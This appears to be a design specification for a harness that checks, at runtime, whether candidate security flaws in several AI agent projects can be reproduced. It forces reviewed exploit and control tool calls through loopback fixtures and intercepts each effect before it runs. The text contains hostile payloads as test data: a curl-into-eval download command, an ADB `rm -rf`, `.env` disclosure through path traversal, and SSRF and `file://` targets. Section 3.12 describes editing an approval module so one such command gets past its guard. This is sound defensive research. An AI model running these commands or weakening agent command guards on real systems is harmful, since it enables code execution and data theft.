# Runtime Validation L2 Test-Validation Schema

## 1. Purpose

This document defines the validation process that consumes an L2 environment built according to
`design/common/runtime-validation-build-test-environment.md`. Given a project and a candidate from
`output/cross-project/coverage-comparison/candidates.jsonl`, the validator must automatically produce
candidate-level runtime evidence and, where applicable, ground-truth-report projection.

The validation process is deterministic. An LLM may propose a case, oracle, instrumentation plan,
fixture values, or payload repair, but deterministic code must review and compile that proposal and
must assign every final disposition.

## 2. Target Interface

The implemented user-facing command requires only project and candidate identity:

```bash
python -m src.runtime_validation validate-candidate-l2 \
  --project mercury-agent \
  --candidate-id CAND-60dd4810687a0688 \
  --candidates output/cross-project/coverage-comparison/candidates.jsonl \
  --out-dir output/cross-project/runtime-auto-l2/CAND-60dd4810687a0688
```

The command may accept optional model/API parameters, but it must not require a manually selected
`cases.jsonl` row, target list, oracle family, instrumentation marker list, GT link, or payload repair.
It accepts the frozen canonical artifact only; a training-overlay or partial denominator is rejected.

## 3. Validation Pipeline

```text
project + candidate ID
→ candidate/artifact intake
→ source and revision binding
→ handler/gate/sink binding
→ LLM plan generation
→ deterministic plan review and compilation
→ generate/reuse reviewed case and L2 oracle
→ request ready environment
→ run three exploit/control pairs
→ normalize and correlate events
→ deterministic oracle evaluation
→ candidate disposition
→ optional GT-report projection
→ publish hashed artifacts
```

The environment builder is a provider to this process. If it returns `environment-blocked`, validation
stops with a blocked/unsupported classification and does not infer a runtime outcome.

### 3.1 Current Implementation Boundary

`validate-candidate-l2` performs deterministic 78-row intake, reuses the independently reviewed
dynamic-trigger case, compiles the handler/gate/sink/pre-effect plan, and publishes candidate-bound
artifacts. The candidate-executor registry currently admits the project-native real-entrypoint
runners for Mercury-Agent, DroidClaw, LettaBot, ChatGPT-on-WeChat, NanoClaw, OpenClaw, OpenClaw-CN,
AstrBot, QwenPaw, Hermes-Agent, and nanobot; each executes three paired attempts through its own
loopback-provider and pre-effect-interceptor contract. Other projects remain `unsupported` when
no project-native candidate instrumentation adapter is registered, even if their project-self-test
environment is ready. This is explicit unfinished-work accounting, not a negative runtime verdict.

The sequential batch command is:

```bash
python scripts/run_candidate_l2_campaign.py \
  --candidates output/cross-project/coverage-comparison/candidates.jsonl \
  --out-dir output/cross-project/runtime-auto-l2
```

Its report ledger must account for exactly 78 candidate verdicts and must preserve the ground-truth
boundary at 38 current-candidate-linked, 5 `candidate-missing`, and 3 non-applicable rows.
Report-level reasons are rendered separately without reclassifying blocked evidence:

```bash
python scripts/render_candidate_l2_gt_analysis.py \
  --candidates output/cross-project/coverage-comparison/candidates.jsonl \
  --campaign output/cross-project/runtime-auto-l2 \
  --out-dir output/cross-project/runtime-auto-l2-gt-analysis-v1
```

An explicitly expanded 80-row boundary preserves the frozen 78-row base and adds only
`CAND-34bd5e2a040b5664` for WebFetch SSRF and `CAND-0e7d7aea6fed1ab0` for Vision SSRF. It projects
41 eligible reports as current-candidate-linked, 2 as `candidate-missing`, and 3 as non-applicable.
The Browser file-scheme historical ID remains excluded because its current source premise is
contradicted. The expanded input is versioned separately; it is not a mutation of the frozen generic
artifact and is not a blind-discovery result.

An explicitly expanded 81-row v3 boundary preserves both recorded predecessors and adds only
`CAND-2bb4433b7deba02c` after a current-source Hermes `skill_view` L2 witness. It projects 42
eligible reports as current-candidate-linked, 1 as `candidate-missing`, and 3 as non-applicable.
The Browser file-scheme candidate remains excluded for the same source-contradiction reason.

### 3.2 Post-hoc GT-Regression Cohort

The frozen generic 78-row artifact can identify only 38 of the 43 eligible reports. The remaining
five report links use four training-only fallback candidates. A separate command selects the exact 61
candidate IDs linked to all 43 eligible reports from the 82-row training overlay:

```bash
python -m src.runtime_validation validate-gt-linked-candidates-l2 \
  --candidates output/cross-project/coverage-comparison/training-regression-candidates.jsonl \
  --out-dir output/cross-project/runtime-auto-l2-gt-regression-v1
```

This is a post-hoc GT-regression cohort, not held-out or generic discovery. Its manifest records the
four training-only IDs, 76 report/candidate links, and the generic-artifact hash. Missing reviewed
fragments remain `planning-blocked` until deterministic review accepts a source-bound plan; they must
not be fabricated from a GT label. A 43/43 runtime claim still requires fresh healthy evidence for
every linked report.

The training-only browser file-scheme candidate is currently planning-blocked because the pinned
BrowserTool rewrites a non-HTTP(S) URL to `https://` before `page.goto`. A GT/fallback link is not
sufficient to claim that the file-scheme sink relation survives current source.

### 3.3 OpenClaw Reference Boundary

The OpenClaw executor covers the five generic candidates linked to the four eligible OpenClaw GT
reports. It creates a hash-guarded instrumented build, then a fresh role workspace, state directory,
fake executable directory, provider transcript, and event trace for every exploit/control attempt.
Its loopback OpenAI-compatible fixture emits one reviewed `exec` tool call followed by one final
tool-result turn; extra requests fail closed. Source instrumentation records handler entry, the exact
command, the cited allowlist gate, the cited process sink, and `executed=false` pre-effect
interception. The shared build can be reused only when project revision, source hashes, lockfile,
entrypoint, and harness hashes all match.

### 3.4 OpenClaw-CN Reference Boundary

The OpenClaw-CN executor covers exactly the nine generic candidates linked to the six eligible
OpenClaw-CN reports; other OpenClaw-CN rows remain unsupported. Browser roles start the real browser
control service and use a deterministic CDP/page fixture before intercepting the cited navigation,
click, evaluate, or tab-creation sink. Exec roles pre-seed only a disposable durable BusyBox wrapper
approval and intercept PTY/process spawn before execution. Patch roles create a dangling final symlink
and intercept `fs.writeFile`; Feishu roles load the real built Feishu plugin and intercept outbound
media fetch. Every role uses the real agent CLI, one reviewed loopback provider tool call plus its
final tool-result turn, disposable state/workspace, strict event identity/order, and cleanup/canary
gates. The shared build also includes the Feishu extension and can be reused only when project
revision, source hashes, lockfile, entrypoint, extension, and harness hashes match.

### 3.5 NanoClaw Reference Boundary

The NanoClaw executor covers exactly the four generic candidates linked to the two eligible NanoClaw
reports. Arbitrary-source roles mount a disposable read-only source outside `/workspace/agent` and
intercept the cited container-side `send_file` copy. A2A roles seed real source/target sessions and
destinations, pre-place a target-inbox symlink for the exploit, drive the real host delivery/A2A
forwarding path, and intercept the host-side copy. Every role runs the real host entrypoint and
Docker agent container through the pinned Claude Agent SDK and a loopback Anthropic-compatible
tool-call/final-turn fixture. Source transforms record native MCP dispatch, the exact path or
filename, the cited routing gate or missing-check boundary, the selected sink, and `executed=false`
interception. The broader `add_mcp_server` report is outside the canonical 43-report boundary and is
not covered by this runner.

### 3.6 ChatGPT-on-WeChat Reference Boundary

The current-candidate executor covers exactly the six generic candidates linked to the three
current-candidate-linked ChatGPT-on-WeChat reports. Every role starts the real `app.py` terminal
channel and drives the repository's OpenAI-compatible client through one reviewed loopback SSE tool
call plus its final tool-result turn. Source transforms record `AgentStreamExecutor` native dispatch,
the exact Read path or Bash command, the cited Bash/Read gates or missing-check boundary, and the
selected `open`, primary `subprocess.run`, or exit-126 retry sink. Read controls run with disposable
`/tmp` mount isolation; Bash and Read effects are intercepted before execution.

A separately labeled post-hoc historical mode admits only WebFetch SSRF and Vision SSRF. WebFetch and
Vision record their missing destination-check boundary and intercept `requests.get` before network
egress; Vision also uses one manifest-recorded auxiliary vision-model request. The Browser `file://`
historical candidate remains `planning-blocked` because the pinned source rewrites a non-http(s) URL
to `https://` before `page.goto`. Neither historical overlay row changes the canonical 78-row input.
When those two executable historical IDs are admitted by the explicit expanded 80-row input, their
receipts are canonical current-candidate evidence; the Browser row remains outside that input.

### 3.7 AstrBot Reference Boundary

The AstrBot executor covers exactly the three generic candidates linked to the two eligible AstrBot
reports. Every role launches the real dashboard/OpenAPI chat boundary as a restricted member in local
computer mode and drives the repository's OpenAI-compatible client through one reviewed SSE tool call
plus its normal continuation. Plugin-skill fixtures use manifest-recorded workspace symlinks so
reviewed relative labels resolve through the real AstrBot path policy. The hardlink fixture uses a
mount namespace, preserves the reviewed `/tmp/allowed_root/...` argument, and proves same-inode
identity with an outside target. Source transforms record native dispatch, handler arguments,
pathname admission, the missing write-specific-root or inode-identity boundary, and terminal write
interception with cleanup/canary verification.

### 3.8 QwenPaw Reference Boundary

The QwenPaw executor covers exactly the one generic candidate linked to the eligible jq
environment-disclosure report. Every role launches the real FastAPI app, drives
`/api/console/chat`, and uses the repository's OpenAI-compatible client in its native SSE mode with
one reviewed `execute_shell_command` call plus one continuation. The real adapter leaves the exact
argument JSON in `raw_input` while AgentScope produces an empty parsed input; the disposable build
applies QwenPaw's documented raw-input repair before ToolGuard. A mount namespace confines the
reviewed `/tmp` working directory and hashed fake jq. Source transforms record native dispatch, the
empty ToolGuard findings, the missing jq environment-object rule, inherited-environment evidence,
and terminal process interception before jq runs.

### 3.9 Hermes Agent Reference Boundary

The Hermes executor covers exactly the 15 GT-linked IDs in the explicit 81-row v3 boundary; the two
unlinked Hermes rows remain unsupported. Standard cases use the real oneshot entrypoint, the command
guard case uses non-YOLO `hermes chat -q` under a PTY, and the cron case creates a real one-shot job
through Hermes' cron state API before `cron run` and `cron tick`. A loopback Chat Completions SSE
provider emits one reviewed tool call and at most one continuation.

The locked no-E2EE Matrix profile is derived from `uv.lock` and uses the real Matrix adapter against
a loopback whoami/sync/account-data fixture. Source transforms record registry dispatch, family
handlers, command/path/linked-file/environment boundaries, and pre-effect interception at local or
browser `Popen`, Matrix `send_message_event`, Slack/Mattermost HTTP post, or skill `Path.read_text`.
Credential values are fake and redacted. Role roots are short-lived `/tmp` directories with bounded
shutdown-aware cleanup.

The current-source `skill_view` fixture proves that `../outside-skill` selects an outside root before
the linked-file check and intercepts `.env` disclosure. The plain-text Matrix candidate is an honest
`not-reproduced` row because plain `javascript:` text is not an href/raw-HTML witness; the linked
Markdown-link candidate confirms that report. The reviewed interactive shell command is also a
healthy `not-reproduced` row when the real guard denies it.

### 3.10 Nanobot Reference Boundary

The nanobot executor covers exactly the five candidates linked to the five eligible allowlist-policy
reports in `generic-81-expanded-v3`; the two unlinked nanobot rows remain unsupported. Every role
launches the real one-shot `nanobot agent` CLI and drives the repository's direct OpenAI-compatible
custom provider with one reviewed `exec` tool call plus one normal continuation.

The disposable build narrowly plumbs the already-existing `ExecTool.allow_patterns` constructor
surface through real configuration at the pinned revision; handler, guard, registry, provider, and
sink security logic are not rewritten. Reviewed payload repairs replace the compiled loopback-URL
forms with report-aligned chain, comment-tail, and nested-wrapper carriers, and the compiled
missing-safe-read and workspace-boundary rows run unchanged. Source transforms record provider
parsing, native registry dispatch, controlled arguments, the factual allow/block or missing-check
boundary, and pre-effect interception at `asyncio.create_subprocess_shell`. The workspace-boundary
candidate is an honest healthy negative when the pinned workspace guard blocks it.

### 3.11 Unified Source-Revised Native Runtime

Four reports formerly handled by additive runners are validated through one native-interface
campaign:

- `GT-0d6ed4cec085773c` uses Nanobot `exec`, with omitted `login` defaulting to true under the
  source-revised login profile and `login=false` as the control.
- `GT-c6a9e97a28acf193` uses OpenClaw `browser(action=act)` with a reviewed wait function.
- `GT-f1647abba5c44969` uses OpenClaw `message(action=send)` with a reviewed `filePath`.
- `GT-e03e7f2d88091689` uses CowAgent `browser(action=navigate)` with an exact reviewed `file://` URL.

The unified CLI is `run-dynamic-trigger-source-revised-native-l2`. Its evidence scope is
`source-revised-native-tool`; candidate IDs formerly used by additive runners remain only as
crosswalk identities. Each role uses the real project entrypoint, loopback provider, native tool
dispatch, exact controlled argument, factual gate or missing-check boundary, and pre-effect sink
interception.

The completed campaign records 4/4 reports as runtime-confirmed with 24/24 valid traces. It does
not alter the frozen canonical 81-candidate denominator, 43-report eligible boundary, or `41/43`
canonical result.

### 3.12 Hermes Agent Source-Revised Native Command Profile

The frozen v3 campaign records `GT-228613a4d41e4934` as a healthy `not-reproduced` result because
Tirith blocks the exact reviewed nested command. The current benchmark source additionally exposes
an explicitly labeled source-revised profile:

`04439ac77f08915b4886bc3c79165a9538af6219+legacy-command-bypass-source-v1`.

The profile changes no tool or candidate interface. `tools/approval.py` retains Tirith for every
other command, but an exact-string set restores the historical allow decision for
`eval $(curl -s http://127.0.0.1:8000/payload.sh)` before the finite dangerous-command regex runs.
The same native `terminal` handler and `CAND-1ba6a7fa9223b90a` therefore exercise provider parsing,
registry dispatch, controlled command entry, the guard decision, and the intercepted
`LocalEnvironment` process sink.

Source-revised artifacts must use a separate output directory and retain the frozen v3 campaign as
the canonical record. They may be reported only as the explicit source-revised profile, not as a
fresh result at base revision `04439ac...`. The completed profile records 14 Hermes candidates as
runtime-confirmed and the plain-text Matrix candidate as healthy `not-reproduced`, with 90/90 valid
traces; the only verdict change from frozen v3 is the exact reviewed command candidate.

## 4. Input and Frozen Identity

### 4.1 Candidate Request Schema

```yaml
schema_version: clawgap-auto-candidate-request/v1
project: mercury-agent
candidate_id: CAND-60dd4810687a0688
candidates_file: output/cross-project/coverage-comparison/candidates.jsonl
coverage_root: output/cross-project/coverage-comparison
attempts: 3
model:
  name: deepseek-v4-flash
  base_url: https://api.deepseek.com/v1
  api_key_env: DEEPSEEK_API_KEY
```

### 4.2 Required Frozen Inputs

Before an LLM call, deterministic intake must load and hash:

- candidate row;
- comparison row;
- semantic IR;
- origin audit;
- capability card;
- handler criterion and handler ID;
- gate IDs and gate semantics;
- sink ID, sink type, and capability card;
- controlled value ID and source context;
- project registry revision;
- cited source files;
- existing reviewed `cases.jsonl`, when available;
- linked GT report rows, when present.

The following mismatches fail closed:

```text
candidate project ≠ requested project
duplicate candidate ID
candidate revision ≠ registry revision
source hash drift
missing comparison/semantic/origin/capability artifact
handler, gate, or sink identity cannot be resolved
controlled value path cannot be resolved
```

## 5. LLM Planning Contract

The LLM emits a schema-constrained proposal. It may choose only among adapter families and anchors
already validated from source.

```yaml
schema_version: clawgap-auto-l2-plan/v1
project: mercury-agent
candidate_id: CAND-...
case_id: DTC-...
runtime_family: node-cli-pty
oracle_family: safe-read-consent-bypass
tool_or_action_name: run_command
entrypoint_plan: {...}
provider_plan: {...}
input_plan: {...}
fixture_plan: {...}
instrumentation_plan: {...}
interceptor_plan: {...}
exploit_arguments: {...}
control_arguments: {...}
expected_gate_outcomes: {...}
expected_sink_relation: {...}
payload_repair: null | {...}
review_questions: [...]
```

### 5.1 Deterministic Review

The plan compiler must reject a proposal unless:

- source anchors are unique and revision-bound;
- handler, gate, and sink anchors match candidate IDs;
- the exploit and control traverse the same runtime path;
- argument extraction exactly follows the candidate field path;
- expected gate outcomes can be observed at cited gates;
- sink relation matches the candidate’s controlled value/relation;
- required events form a directed, acyclic, duplicate-free order;
- terminal effect has a pre-effect interceptor;
- disposable roots, process group, and cleanup canary are defined;
- provider protocol/input transport/perception fixtures are supported;
- generated source compiles and instrumentation smoke passes;
- no host write, real credential, external network, or gate bypass is requested.

One deterministic repair round is allowed. A second invalid plan produces `planning-blocked`.

### 5.2 Payload Repair Schema

```yaml
schema_version: clawgap-candidate-payload-repair/v1
candidate_id: CAND-...
original_payload: ...
repaired_payload: ...
reason: ...
semantic_preservation_proof:
  controlled_value_id: ...
  original_relation: ...
  repaired_relation: ...
  excluded_unrelated_gate: ...
```

A repair is valid only when it preserves the candidate’s security semantics and avoids an unrelated
gate or fixture blocker. Repairs must be published and must never disable a permission mode, grant a
filesystem scope, use a real credential, or choose Allow All.

## 6. Reviewed Case Schema

The validator can reuse `clawgap-dynamic-trigger-case/v1` or generate a per-candidate equivalent. The
required semantic fields are:

```yaml
schema_version: clawgap-auto-l2-case/v1
project: ...
revision: ...
candidate_binding:
  candidate_id: ...
  row_sha256: ...
  comparison_sha256: ...
  semantic_ir_sha256: ...
  origin_audit_sha256: ...
handler:
  id: ...
  tool_or_action_name: ...
  argument_path: [...]
gates:
  - id: ...
    expected_outcome: admits-exploit | rejects-exploit | absent-or-bypassed
sink:
  id: ...
  family: ...
  payload_role: ...
unsafe_relation:
  path: [...]
  exploit_value: ...
  control_value: ...
  relation: equals | contains | command-segment | path-suffix | semantic-effect
forced_tool_calls:
  - role: exploit
    arguments: {...}
  - role: control
    arguments: {...}
effect_policy:
  intercept_before_execution: true
  allow_host_write: false
  allow_network: loopback-only
payload_repair: null | {...}
```

A generated case is not accepted merely because the LLM produced valid JSON. It is accepted only after
deterministic source-binding and relation checks.

## 7. Oracle Schema

```yaml
schema_version: clawgap-auto-l2-oracle/v1
candidate_id: ...
case_id: ...
attempts: 3
roles: [exploit, control]

identity:
  correlation_template: "<case-id>:<attempt>:<role>"
  fixture_template: "<project>-l2:<case-id>:<role>"
  required_fields:
    - schema_version
    - stage
    - candidate_id
    - case_id
    - attempt
    - role
    - correlation_id
    - fixture_id
    - ordinal
    - detail

exploit:
  required_prefix:
    - case_bound
    - source_verified
    - fixture_prepared
    - launch_started
    - prompt_received
    - provider_request
    - provider_tool_call_or_decision
    - registry_or_native_dispatch
    - handler_entered
    - controlled_argument_recorded
    - gate_observed
    - sink_reached
    - pre_effect_interception
    - target_completed
    - cleanup_verified
  optional_stages: [safe_read_classified, consent_sink_reached, permission_mode_selected]
  value_relation: {...}
  gate_relation: {...}
  sink_relation: {...}
  interception:
    executed: false

control:
  required_healthy_prefix: [...]
  forbidden_stages: [...]
  value_relation: {...}
  semantic_constraint: preserve-reviewed-control | no-unsafe-effect | explicit-safe-effect-allowed

health:
  process_exit: [0]
  provider_exchange: exact-contract
  readiness_boundary: true
  ordinals: contiguous
  stages: unique
  cleanup_canary: unchanged
  credentials: redacted
  disposable_roots_removed: true
```

Oracle families are extensible, but every family must define value, gate, sink, and pre-effect
relations.

### 7.1 Supported Oracle Families

| Family | Exploit requirement | Control requirement |
|---|---|---|
| process-sink | exact value admitted through cited gate and reaches controlled process spawn | healthy; no unsafe process effect unless explicitly safe |
| consent-bypass | unsafe semantic action auto-approved without `askHandler`/consent and reaches impact sink | exact reviewed value; safe effect may be allowed if declared |
| filesystem-bypass | effective path escapes allowed workspace and reaches file primitive | permitted path remains confined or is intercepted |
| network-ssrf | controlled URL reaches network client; only loopback fixture responds | blocked/public URL does not reach external network |
| browser-effect | model-controlled navigation/action reaches browser boundary before launch | safe page or blocked external navigation |
| messaging-send | model-controlled recipient/content reaches send API on loopback fixture | unauthorized recipient blocked or captured only |
| adb-shell | exact command reaches ADB shell sink with no approval gate | startup-only ADB or rejected command |
| subagent-delegation | privileged subagent configuration reaches foreground/background child boundary | unprivileged/nonexistent type blocked or controlled |
| database-write | controlled statement reaches disposable DB/write primitive | read-only statement or blocked write |
| structured-action | reviewed action JSON dispatches through native action dispatcher and cited sink | control follows same action path and reviewed relation |

## 8. Event Validation

### 8.1 Minimum Event Fields

Every normalized event must contain:

```text
schema_version
event_id or deterministic event identity
stage
candidate_id
case_id
attempt
role
correlation_id
fixture_id
ordinal
detail
source_anchor
```

### 8.2 Correlation Rules

For each role trace:

- all identity fields must be internally identical;
- ordinals must be contiguous from one;
- stages must be unique;
- events must arrive in compiled order;
- provider request must precede native dispatch;
- dispatch must precede handler;
- controlled value must precede cited gate decision;
- gate decision must precede allowed sink;
- sink must precede pre-effect interception;
- target completion must follow all real/runtime events;
- cleanup verification must be last.

### 8.3 Cross-Artifact Correlation

The validator must bind:

```text
candidate row ↔ case ↔ environment plan ↔ oracle ↔ event ↔ provider transcript ↔ transformed source ↔ result
```

A trace from another attempt, role, candidate, fixture, process, or source revision is invalid.

## 9. Paired Execution Contract

Each candidate runs exactly:

```text
3 attempts × 2 roles = 6 role traces
```

unless a project protocol requires an additional final provider response; that response is part of one
role invocation and does not create another role trace.

For each attempt:

1. launch a fresh environment;
2. choose Ask Me/default policy where applicable;
3. submit the reviewed prompt;
4. force only the reviewed exploit/control tool call or structured decision;
5. capture provider request/response;
6. observe native dispatch, handler, value, gate, and sink;
7. intercept terminal effect;
8. stop process group;
9. verify cleanup canary and disposable roots;
10. normalize and evaluate events.

The target model must be labelled:

```text
target_provider=loopback-fixture
selection_mode=forced-provider-tool-call
live_prompt_triggerability=not-tested
effect_execution=intercepted-before-effect
```

## 10. Candidate Dispositions

Only deterministic evaluation may assign:

### `runtime-confirmed`

All three paired attempts are healthy and every exploit satisfies the compiled value, gate, sink,
identity, and pre-effect oracle.

### `not-reproduced`

All three paired attempts are healthy, the real provider/dispatch/handler path is observed, and the
exploit fails the reviewed unsafe relation. This disposition requires healthy negative evidence; it is
not a fallback for setup failure.

Controls normally must be blocked before the terminal sink. A reviewed source-case may explicitly
allow a safe carrier to reach the pre-effect interceptor, but only when its oracle records the exact
control value, required sink/interception stages, and rationale. The Hermes `/dev/null` control is one
such narrow case; this exception cannot be inferred for another candidate.

### `inconclusive`

One or more attempts have environment, build, launch, provider, instrumentation, trace, correlation,
control, cleanup, credential, timeout, source-drift, or fixture failure.

### `unsupported`

A required language, entrypoint, provider, input, perception, sink, or interceptor adapter does not
exist.

### `planning-blocked`

The LLM plan cannot be validated after the allowed repair round.

### `environment-blocked`

The environment builder cannot produce a ready environment.

## 11. Ground-Truth Projection

A candidate result must not be conflated with report coverage. Projection is allowed only from an
explicit report/candidate binding:

```yaml
schema_version: clawgap-auto-gt-projection/v1
project: ...
report_id: GT-...
report_name: ...
matched_candidate_ids: [...]
dispositions_by_candidate: {...}
disposition: runtime-confirmed | not-reproduced | inconclusive
reason: ...
```

Report aggregation:

- any linked healthy `runtime-confirmed` candidate confirms the report;
- otherwise all linked healthy `not-reproduced` candidates produce `not-reproduced`;
- otherwise an `inconclusive`, `planning-blocked`, or `environment-blocked` linked result makes the
  report `inconclusive`;
- otherwise a linked `unsupported` result remains `linked-unsupported` rather than becoming a healthy
  negative;
- missing candidates remain `candidate-missing`;
- boundary rows remain `non-applicable`.

The aggregation policy is deterministic and shared by the candidate publisher, sequential batch
wrapper, and report renderer: a healthy confirmation wins over a separate inconclusive linked result;
it never wins over source/revision drift in its own candidate evidence.

Projection must preserve the current 46-row GT accounting boundary and must not turn targeted evidence
into a canonical 78-candidate L2 claim.

## 12. DroidClaw Reference Contract

DroidClaw is the reference pattern for a complete environment-to-validation chain:

```text
loopback OpenAI-compatible Chat Completions/SSE fixture
→ real Bun src/kernel.ts entrypoint
→ stdin “Enter your goal” boundary
→ fake screen XML and fake ADB startup perception
→ real OpenAI SDK client through DroidClaw’s Ollama provider path
→ forced reviewed ActionDecision JSON
→ executeAction dispatch
→ executeShell handler
→ cited non-empty-command gate
→ ADB shell sink
→ pre-effect interception
→ controlled response and target completion
```

For the canonical candidate, the exploit is confirmed only when:

- the real provider issued exactly the reviewed request;
- `executeAction` dispatched the exact action;
- `executeShell` received `action.command`;
- the cited non-empty-command gate admitted it without an approval gate;
- sink arguments were exactly `["shell","rm","-rf","/data/local/tmp"]`;
- interception occurred before ADB execution;
- the empty control was rejected before sink/effect stages;
- all identities, ordinals, fixture IDs, source hashes, and cleanup checks agreed.

This is the minimum semantic fidelity required from every project-specific oracle.

## 13. Twelve-Project Validation Matrix

| Project | Native dispatch/action | Primary oracle families | Current common-launcher status |
|---|---|---|---|
| `AstrBot` | dashboard/OpenAPI chat → FunctionTool native dispatch | filesystem write/edit policy and hardlink identity | targeted pilot available |
| `QwenPaw` | console API → AgentScope/ToolGuard native tool dispatch | process environment disclosure | targeted pilot available |
| `chatgpt-on-wechat` | terminal channel → AgentStream native tool dispatch | process, filesystem; post-hoc network and browser | targeted pilot available |
| `hermes-agent` | Hermes tool registry through oneshot/chat/cron | process, filesystem, browser, messaging, skill reads | targeted pilot available |
| `nanobot` | one-shot CLI → custom provider → agent tool registry | allowlist chain/comment/wrapper process policy | targeted pilot available |
| `poco-agent` | backend/executor agent and tool APIs | process, browser, database, storage, network | profile required |
| `droidclaw` | structured `ActionDecision` → `executeAction` | ADB shell, structured action | targeted pilot available |
| `lettabot` | Letta Code SDK `executeTool` | subagent privilege/delegation | targeted pilot available |
| `mercury-agent` | AI SDK `run_command` tool dispatch | process, safe-read consent bypass | targeted pilot available |
| `nanoclaw` | service/session tool dispatch | filesystem source containment, A2A inbox symlink | targeted pilot available |
| `openclaw` | agent/tool executor | process, browser, messaging, filesystem | targeted pilot available |
| `openclaw-cn` | agent/tool executor | process, browser, messaging, filesystem | targeted pilot available |

“Targeted pilot available” means a project-specific command has produced L2 evidence; it does not mean
the shared all-project launcher or all future candidates are ready.

## 14. Result and Artifact Schemas

### 14.1 Candidate Result

```json
{
  "schema_version": "clawgap-auto-l2-candidate-result/v1",
  "project": "mercury-agent",
  "candidate_id": "CAND-...",
  "case_id": "DTC-...",
  "disposition": "runtime-confirmed",
  "evidence_tier": "L2-forced-provider-E2E",
  "attempts": 3,
  "reason": "all paired forced-provider E2E attempts satisfied the oracle",
  "attempt_errors": [],
  "payload_repair_applied": true
}
```

### 14.2 Required Output Files

```text
candidate.json
cases.jsonl
plan.json
plan-review.json
oracle.json
payload-repairs.jsonl
environment-ledger.jsonl
candidate-results.jsonl
qualification.jsonl
gt-projection.jsonl
manifest.json
summary.md
runs/<case-id>/attempt-<N>/<role>/events.raw.jsonl
runs/<case-id>/attempt-<N>/<role>/events.jsonl
runs/<case-id>/attempt-<N>/<role>/provider-transcript.jsonl
runs/<case-id>/attempt-<N>/<role>/transformed-source-manifest.json
runs/<case-id>/attempt-<N>/<role>/launch.log
```

The manifest must record source, dependency, build, plan, oracle, instrumentation, harness, event, and
result hashes; model identity; repairs; status counts; credential scan; cleanup; and the exact
reproduction command.

## 15. Acceptance Tests for the Validator

The validator implementation is complete only when tests cover:

1. exact candidate selection and duplicate/missing fail-closed behavior;
2. all frozen artifact hashes;
3. source/revision drift;
4. valid and invalid LLM plans;
5. deterministic repair acceptance/rejection;
6. semantic payload repair preservation;
7. case/oracle compilation;
8. each oracle family used by the target project;
9. provider request/response contract;
10. event identity/order/correlation;
11. controlled-value drift;
12. gate outcome drift;
13. sink relation drift;
14. pre-effect interception;
15. unhealthy control;
16. timeout/nonzero exit;
17. source and provider transcripts;
18. credential redaction;
19. cleanup canary and residual roots;
20. candidate aggregation over three attempts;
21. GT projection;
22. targeted-only boundary;
23. generic 78 versus post-hoc 61-ID GT-regression cohort separation;
24. `unsupported` and boundary rows cannot become `not-reproduced`.

## 16. Publication Boundaries

- Never promote L1 native-dispatch evidence to L2.
- Never convert launch smoke into runtime confirmation.
- Never execute the reviewed terminal effect.
- Never claim live-model triggerability from a forced provider response.
- Never overwrite the canonical 78-candidate input while applying a targeted repair.
- Never present the 61-ID GT-regression cohort as generic or blind discovery.
- Never mark all-project L2 ready from one targeted pilot.
- Never replace `candidate-missing` GT rows with generic diagnostics.
- Never publish a verdict without source, environment, oracle, event, and result hashes.
